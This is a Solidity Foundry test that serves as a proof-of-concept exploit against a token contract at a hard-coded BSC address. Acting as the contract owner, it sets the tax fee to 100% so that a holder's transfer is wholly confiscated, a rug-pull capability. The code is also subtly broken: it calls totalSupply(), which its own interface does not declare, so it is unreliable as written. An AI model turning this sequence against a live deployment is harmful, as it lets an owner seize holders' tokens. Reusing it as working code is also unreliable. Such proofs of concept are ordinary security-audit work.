```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Minimal interface for TeaToken functions needed in the test
interface ITeaToken {
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function setTaxFeePercent(uint256 taxFee) external;
    function setLiquidityFeePercent(uint256 liquidityFee) external;
    function excludeFromFee(address account) external;
    function isExcludedFromFee(address account) external view returns (bool);
}

contract ExploitTest is Test {
    // Deployed contract address on BSC
    ITeaToken constant teaToken = ITeaToken(0x5e18Be2A7cE626B33C539919EAca06303f1Db568);

    address owner;
    address user = address(0x1234);
    address recipient = address(0x5678);

    function setUp() public {
        // Get the owner from the contract
        owner = teaToken.owner();
        // Label addresses for readability
        vm.label(owner, "Owner");
        vm.label(user, "User");
        vm.label(recipient, "Recipient");
        vm.label(address(teaToken), "TeaToken");

        // Owner transfers some tokens to user and recipient for testing
        // The owner has the initial total supply
        vm.prank(owner);
        teaToken.transfer(user, 1000);
        vm.prank(owner);
        teaToken.transfer(recipient, 1000);
    }

    function testUncheckedMaxFeePercent() public {
        // Ensure user is not excluded from fee (otherwise transfer would be fee-free)
        assertFalse(teaToken.isExcludedFromFee(user));

        // Record balances before the exploit
        uint256 userBalanceBefore = teaToken.balanceOf(user);
        uint256 recipientBalanceBefore = teaToken.balanceOf(recipient);

        // ---- Owner sets fees to extreme values ----
        vm.startPrank(owner);
        // First set liquidity fee to 0 to avoid revert when tax fee + liquidity > 100%
        teaToken.setLiquidityFeePercent(0);
        // Now set tax fee to 100% (100 means 100%)
        teaToken.setTaxFeePercent(100);
        vm.stopPrank();

        // User attempts to send 100 tokens to recipient
        vm.prank(user);
        teaToken.transfer(recipient, 100);

        // Check that recipient received 0 tokens (100% tax burned)
        uint256 recipientBalanceAfter = teaToken.balanceOf(recipient);
        assertEq(recipientBalanceAfter, recipientBalanceBefore, "Recipient should not receive any tokens");

        // User's balance decreased by the full 100 (burned entirely)
        uint256 userBalanceAfter = teaToken.balanceOf(user);
        assertEq(userBalanceAfter, userBalanceBefore - 100, "User should lose 100 tokens");

        // Total supply should have decreased because the tokens were burned via reflection
        // (optional assertion but demonstrates impact)
        assertLt(teaToken.totalSupply(), 10000000 * 10**2 * 10**2, "Total supply should have decreased");
    }
}
```
